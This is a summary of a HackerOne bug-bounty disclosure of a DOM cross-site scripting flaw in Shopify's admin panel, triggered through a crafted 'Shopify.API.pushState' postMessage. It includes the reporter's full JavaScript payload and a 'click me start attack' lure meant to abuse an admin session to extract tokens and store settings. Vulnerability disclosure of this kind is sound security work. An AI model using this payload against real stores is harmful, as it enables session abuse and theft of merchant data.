# Inject page in admin panel via Shopify.API.pushState with protocol invalid

## Metadata
- **Source:** HackerOne
- **Report:** 868615 | https://hackerone.com/reports/868615
- **Submitted:** 2020-05-08
- **Reporter:** tiago-danin
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - DOM
- **CVEs:** None
- **Category:** web-api

## Summary
# Disclose Token in reports
## Summary
Some time, i found a bug the #662083.
Today I found a new payload, invalid protocol are not tested correctly in filter method.

## Step to Reproduce
See the steps in #662083, but with payload of step 02 replace to:

```javascript
<script>
function attack(){
    const ctx = window.open(location.origin+'/admin/themes', '_blank')
    const data = JSON.stringify(

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

# Disclose Token in reports
## Summary
Some time, i found a bug the #662083.
Today I found a new payload, invalid protocol are not tested correctly in filter method.

## Step to Reproduce
See the steps in #662083, but with payload of step 02 replace to:

```javascript
<script>
function attack(){
    const ctx = window.open(location.origin+'/admin/themes', '_blank')
    const data = JSON.stringify({
        message: 'Shopify.API.pushState',
        data: {pathname: "invalid:pages/xss"}
    });

    let interval;
    interval = setInterval(function(){
        if (window.attackSuccess) {
            clearInterval(interval)
        } else {
            ctx.postMessage(data)
        }
    }, 500)
}
attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## Impact

Abuse the active admin session to extract data as:

Get tokens.
Store config.

</details>

---
*Analysed by Claude on 2026-05-24*
